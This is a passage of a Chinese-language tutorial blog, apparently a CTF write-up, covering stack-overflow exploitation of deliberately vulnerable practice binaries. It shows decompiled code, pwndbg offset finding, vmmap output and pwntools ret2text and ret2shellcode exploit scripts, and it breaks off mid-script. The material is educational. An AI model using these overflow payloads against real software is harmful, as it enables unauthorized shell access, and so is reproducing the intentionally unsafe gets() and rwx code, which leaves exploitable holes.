+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_8048760<span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> input <span class="token operator">==</span> secretcode <span class="token punctuation">)</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们可以考虑直接跳到 system(“&#x2F;bin&#x2F;sh”) 执行地址即可，我们找到代码片段也就是secure函数汇编片段</p>
+<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">.text:080485FD secure          proc near
+.text:080485FD
+.text:080485FD input           &#x3D; dword ptr -10h
+.text:080485FD secretcode      &#x3D; dword ptr -0Ch
+.text:080485FD
+.text:080485FD ; __unwind &#123;
+.text:080485FD                 push    ebp
+.text:080485FE                 mov     ebp, esp
+.text:08048600                 sub     esp, 28h
+.text:08048603                 mov     dword ptr [esp], 0 ; timer
+.text:0804860A                 call    _time
+.text:0804860F                 mov     [esp], eax      ; seed
+.text:08048612                 call    _srand
+.text:08048617                 call    _rand
+.text:0804861C                 mov     [ebp+secretcode], eax
+.text:0804861F                 lea     eax, [ebp+input]
+.text:08048622                 mov     [esp+4], eax
+.text:08048626                 mov     dword ptr [esp], offset unk_8048760
+.text:0804862D                 call    ___isoc99_scanf
+.text:08048632                 mov     eax, [ebp+input]
+.text:08048635                 cmp     eax, [ebp+secretcode]
+.text:08048638                 jnz     short locret_8048646
+.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;
+.text:08048641                 call    _system
+.text:08048646
+.text:08048646 locret_8048646:                         ; CODE XREF: secure+3B↑j
+.text:08048646                 leave
+.text:08048647                 retn
+.text:08048647 ; &#125; &#x2F;&#x2F; starts at 80485FD
+.text:08048647 secure          endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么我们需要劫持跳转的后门地址就是对应的 <strong>0804863A</strong> </p>
+<p>payload &#x3D; b’a’*(0x64+4)+p32(shell_addr)  但是实际打会发现偏移量是有问题的，所以更需要进行动态调试</p>
+<h3 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h3><pre class="line-numbers language-asciiarmor" data-language="asciiarmor"><code class="language-asciiarmor">#选择文件进行pwndbg
+gdb ret2text
+#使用cyclic 生成150不规则字符串用于测速
+pwndbg&gt; cyclic 150
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+#运行并输入准备好的测速字符串
+pwndbg&gt; run
+Starting program: &#x2F;home&#x2F;pipi&#x2F;Desktop&#x2F;stack_pwn&#x2F;ret2text&#x2F;ret2text 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libthread_db.so.1&quot;.
+There is something amazing here, do you know anything?
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2026/10/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/image-20261022195017284.png"></p>
+<p>那么可以发现真实偏移量 </p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2text'</span><span class="token punctuation">)</span>
+shell_addr <span class="token operator">=</span> <span class="token number">0x804863A</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2026/10/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/image-20261022195320720.png"></p>
+<p>成功劫持到后门</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p>
+<blockquote>
+<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
+</blockquote>
+<p>首先检测程序开启的保护：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">🐑🍻🐆➜  ret2shellcode checksec ret2shellcode 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pipi/Desktop/stack_pwn/ret2shellcode/ret2shellcode'</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+    Debuginfo:  Yes
+🐑🍻🐆➜  ret2shellcode <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里明显没有开启NX包含，那么它对应的有读写执行段，我们才可以尝试进行shellcode写入</p>
+<p>丢进IDA反编译看下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">//这里调用gets无限输入</span>
+  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//又把输入到s的值给到buf2</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其实这就已经很明显的栈溢出了，再看看最后复制到的buf2的是否处于可写段</p>
+<pre class="line-numbers language-none"><code class="language-none">.bss:0804A065                 align 20h
+.bss:0804A080                 public buf2
+.bss:0804A080 ; char buf2[100]
+.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
+.bss:0804A080 _bss            ends
+.bss:0804A080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>没问题buf2处于.bss段，现在就需要确定.bss段是不是可执行段，最简单办法就行pwndbg 使用vmmap查看</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+ 0x8048000  0x8049000 r-xp     1000       0 ret2shellcode
+ 0x8049000  0x804a000 r--p     1000       0 ret2shellcode
+ 0x804a000  0x804b000 rw-p     1000    1000 ret2shellcode
+0xf7d7a000 0xf7d9d000 r--p    23000       0 &#x2F;usr&#x2F;lib32&#x2F;libc.so.6
+0xf7d9d000 0xf7f1c000 r-xp   17f000   23000 &#x2F;usr&#x2F;lib32&#x2F;libc.so.6
+0xf7f1c000 0xf7fa1000 r--p    85000  1a2000 &#x2F;usr&#x2F;lib32&#x2F;libc.so.6
+0xf7fa1000 0xf7fa3000 r--p     2000  227000 &#x2F;usr&#x2F;lib32&#x2F;libc.so.6
+0xf7fa3000 0xf7fa4000 rw-p     1000  229000 &#x2F;usr&#x2F;lib32&#x2F;libc.so.6
+0xf7fa4000 0xf7fae000 rw-p     a000       0 [anon_f7fa4]
+0xf7fbe000 0xf7fc0000 rw-p     2000       0 [anon_f7fbe]
+0xf7fc0000 0xf7fc4000 r--p     4000       0 [vvar]
+0xf7fc4000 0xf7fc6000 r--p     2000       0 [vvar_vclock]
+0xf7fc6000 0xf7fc9000 r-xp     3000       0 [vdso]
+0xf7fc9000 0xf7fca000 r--p     1000       0 &#x2F;usr&#x2F;lib32&#x2F;ld-linux.so.2
+0xf7fca000 0xf7fed000 r-xp    23000    1000 &#x2F;usr&#x2F;lib32&#x2F;ld-linux.so.2
+0xf7fed000 0xf7ffb000 r--p     e000   24000 &#x2F;usr&#x2F;lib32&#x2F;ld-linux.so.2
+0xf7ffb000 0xf7ffd000 r--p     2000   31000 &#x2F;usr&#x2F;lib32&#x2F;ld-linux.so.2
+0xf7ffd000 0xf7ffe000 rw-p     1000   33000 &#x2F;usr&#x2F;lib32&#x2F;ld-linux.so.2
+0xfffdd000 0xffffe000 rwxp    21000       0 [stack]
+pwndbg&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里可以看见咱们是24.04的环境，所以可以观察发现.bss所在的段并没有可执行权限，所以没法按传统做法去做</p>
+<p>但是这里可以参考 exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+ 
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
+<span class="token comment">#这里的 sh 是一个变量，用于存储 process 函数的返回值。process 函数是 pwntools 库中的一个函数，用于启#动一个外部程序，并返回一个与之交互的对象。在这个例子中，sh 变量指向了启动的 ./ret2shellcode 程序的进#程对象。您可以使用这个对象来发送数据给进程、接收进程的数据等。</span>
+ 
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">##这里的 sh 是 shellcraft 库中的一个函数，名为 sh()。这个函数用于生成一个 shellcode，该 shellcode </span>
+<span class="token comment">#的功能是创建一个 shell。asm 函数是 pwntools 库中的一个函数，用于将汇编代码（这里是 shellcraft.sh() #生成的）转换成机器码。shellcode 变量存储了这个转换后的机器码。</span>
+<span class="token comment">#使用 pwntools 的 shellcraft 模块生成一个 shellcode，这个 shellcode 会创建一个 shell，asm 函数将 #shellcode 从 Python 对象转换成机器码。</span>
+<span class="token comment">#上面两个sh含义不同</span>
+ 
+buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>
+ 
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+<span class="token comment">##发送构造的溢出数据到程序中。这里做了几件事情：</span>
+<span class="token comment">#shellcode.ljust(112, b'A')：将生成的 shellcode 左边填充（左对齐）到 112 个字节长，不足的        </span>
+<span class="token comment">#部分用字符 'A' 填充。</span>
+<span class="token comment">#p32(buf2_addr)：将地址 buf2_addr 打包成 32 位的机器码。</span>
+<span class="token comment">#sendline：发送一整行数据到程序中，这里发送的是填充后的 shellcode 加上返回地址。</span>
+ 
+ 
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="另一个例子"><a href="#另一个例子" class="headerlink" title="另一个例子"></a>另一个例子</h3><p>这里我们以通过<code>mprotect()</code>动态修改过内存页权限的 ret2shellcode 为例，需要注意的是，这样我们就可以在例如 Ubuntu-24.04 这样的现代操作系统中完成这个实验.</p>
+<p>ret2shellcode.c</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+
+<span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 全局 .bss 数组</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>
+
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 把 buf2 所在页向下对齐，然后整页改成 rwx</span>
+    addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>buf2 <span class="token operator">&amp;</span> <span class="token operator">-</span><span class="token function">getpagesize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mprotect</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token function">getpagesize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token comment">// 7 = PROT_READ|PROT_WRITE|PROT_EXEC</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf2 address: %p\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 泄露 buf2 运行时地址</span>
+        <span class="token function">gets</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 栈溢出点</span>
+        <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> src<span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 把前 100 字节拷进 buf2</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mprotect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><pre class="line-numbers language-none"><code class="language-none">gcc -fno-stack-protector -no-pie -Wl,-z,norelro -z execstack -o ret2shellcode ret2shellcode.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">🐑🍻🐆➜  ret2shellcode checksec ret2shellcode
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pipi/Desktop/stack_pwn/ret2shellcode/ret2shellcode'</span>
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+🐑🍻🐆➜  ret2shellcode 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>buf2 <span class="token operator">&amp;</span> <span class="token operator">-</span><span class="token function">getpagesize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token function">getpagesize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">mprotect</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mprotect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf2 address: %p\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">gets</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> src<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>关键</strong>：mprotect 把 buf2 所在页改成 rwx，同时也泄露了buf2的地址</p>
+<pre class="line-numbers language-none"><code class="language-none">.bss:00000000004033C0                 public buf2
+.bss:00000000004033C0 ; char buf2[104]
+.bss:00000000004033C0 buf2            db 68h dup(?)           ; DATA XREF: main+62↑o
+.bss:00000000004033C0                                         ; main+9F↑o ...
+.bss:00000000004033C0 _bss            ends
+.bss:00000000004033C0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在我们进行动态查看buf2所在bss段是否具备可执行权限，断点在执行mprotect之后即可再执行vmmap</p>
+<pre class="line-numbers language-none"><code class="language-none">b *0x4012A2
+run
+c
+vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre><code>        Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+      0x400000           0x401000 r--p     1000       0 ret2shellcode
+      0x401000           0x402000 r-xp     1000    1000 ret2shellcode
+      0x402000           0x403000 r--p     1000    2000 ret2shellcode
+      0x403000           0x404000 rwxp     1000    2000 ret2shellcode  &lt;--权限已经变成rwx
+0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
+0x7ffff7c28000     0x7ffff7db1000 r-xp   189000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+</code></pre>
+<p>buf2所在的bss段已经具备执行权限，接下来就是测试溢出值 依旧就是通过cyclic 生成字符串进行辅助测试最后测试出是120，然后进行编写exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ret2shellcode'</span>  
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
+shell <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> <span class="token number">120</span>
+buf_addr <span class="token operator">=</span> <span class="token number">0x4033c0</span>
+payload <span class="token operator">=</span> shell<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>context.binary</code> &#x3D; ‘.&#x2F;ret2shellcode’  </p>
+<p>能自动设置架构和位宽 让 pwntools 自动读取 ELF 文件，把你原本要手动设置的一堆参数一次性配好</p>
+<p><code>ljust</code>  把原字符串靠左放，右边用指定字符补齐到目标总长度。</p>
+<p>使用方法：原字符串.ljust(目标总长度, 填充字符)</p>
+<p>其中这个buf_addr是因为关了PIE我们能拿到固定的地址如果开启地址随机化那么也可以通过程序中的打印的buf地址去获取，包括这个shellcode如果说写入的字数限制了但是我们pwntools生成的shellcode又太大的话，也可以尝试手写生成的shellcode用更短的去替代</p>
+<p>比如如下</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ret2shellcode'</span>
